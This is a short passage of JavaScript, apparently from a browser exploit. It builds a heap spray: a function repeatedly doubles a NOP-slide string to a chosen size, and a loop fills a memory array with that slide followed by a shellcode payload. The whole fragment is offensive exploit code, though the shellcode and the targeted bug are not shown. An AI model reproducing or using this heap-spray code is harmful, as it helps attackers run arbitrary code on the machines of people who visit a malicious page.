   memory[i] = spraySlide + shellcode;

function getSpraySlide(spraySlide, spraySlideSize)
{
while (spraySlide.length*2<spraySlideSize)
{
   spraySlide += spraySlide;
}
spraySlide = spraySlide.substring(0,spraySlideSize/2);
return spraySlide;
}
